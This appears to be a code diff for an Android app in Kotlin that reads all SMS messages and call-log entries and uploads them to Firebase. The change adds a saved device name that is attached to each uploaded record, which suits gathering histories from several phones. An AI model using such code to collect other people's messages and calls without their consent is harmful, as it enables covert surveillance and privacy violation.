@@ -8,6 +8,7 @@ import android.os.Bundle
 import android.provider.CallLog
 import android.provider.Telephony
 import android.widget.Button
+import android.widget.EditText
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
@@ -28,16 +29,28 @@ class MainActivity : AppCompatActivity() {
     }.toTypedArray()
 
     private lateinit var statusText: TextView
+    private lateinit var deviceNameInput: EditText
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
         statusText = findViewById(R.id.statusText)
+        deviceNameInput = findViewById(R.id.deviceNameInput)
+        val btnSaveDeviceName = findViewById<Button>(R.id.btnSaveDeviceName)
         val btnPermission = findViewById<Button>(R.id.btnPermission)
         val btnSyncHistory = findViewById<Button>(R.id.btnSyncHistory)
 
+        deviceNameInput.setText(DevicePrefs.getDeviceName(this))
         updateStatus()
+
+        btnSaveDeviceName.setOnClickListener {
+            val name = deviceNameInput.text.toString().trim()
+            if (name.isNotEmpty()) {
+                DevicePrefs.setDeviceName(this, name)
+                Toast.makeText(this, "Ном сақланди: $name", Toast.LENGTH_SHORT).show()
+            }
+        }
 
         btnPermission.setOnClickListener {
             ActivityCompat.requestPermissions(this, requiredPermissions, 100)
@@ -85,6 +98,8 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun syncExistingHistory() {
+        val device = DevicePrefs.getDeviceName(this)
+
         contentResolver.query(
             Telephony.Sms.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} DESC"
         )?.use { cursor ->
@@ -96,7 +111,7 @@ class MainActivity : AppCompatActivity() {
                 val sender = cursor.getString(addressIdx) ?: "Номаълум"
                 val body = cursor.getString(bodyIdx) ?: ""
                 val date = cursor.getLong(dateIdx)
-                FirebaseHelper.pushSms(sender, body, date)
+                FirebaseHelper.pushSms(sender, body, date, device)
                 count++
             }
         }
@@ -120,7 +135,7 @@ class MainActivity : AppCompatActivity() {
                     CallLog.Calls.MISSED_TYPE -> "missed"
                     else -> "boshqa"
                 }
-                FirebaseHelper.pushCall(number, type, date, duration)
+                FirebaseHelper.pushCall(number, type, date, duration, device)
                 count++
             }
         }
